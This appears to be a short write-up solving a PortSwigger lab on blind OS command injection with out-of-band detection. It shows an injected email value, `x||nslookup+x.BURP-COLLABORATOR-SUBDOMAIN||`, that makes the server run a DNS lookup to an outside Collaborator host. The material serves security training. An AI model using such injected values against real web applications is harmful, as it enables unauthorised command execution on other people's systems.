## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/1ab126b2-2168-409d-a4d9-bace7cb8ca6c)

## Solution:

Use Burp Suite to intercept and modify the request that submits feedback.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/01f78849-d60f-48e5-90a5-e8f6191a5587)

Modify the email parameter, changing it to:

email=`x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/14ae8e37-d465-4c65-a06a-a6e75dd98441)

Then go to Burp Collaborator press poll now.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/664bcabb-4126-4e3b-9d68-8841f3f6cffe)

We could see that it performed the dns request to our domain. Which means that it is vulnerable to Blind Command injection. Lab Solved

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/9fe34003-1001-4e4f-8d64-b319968ea874)


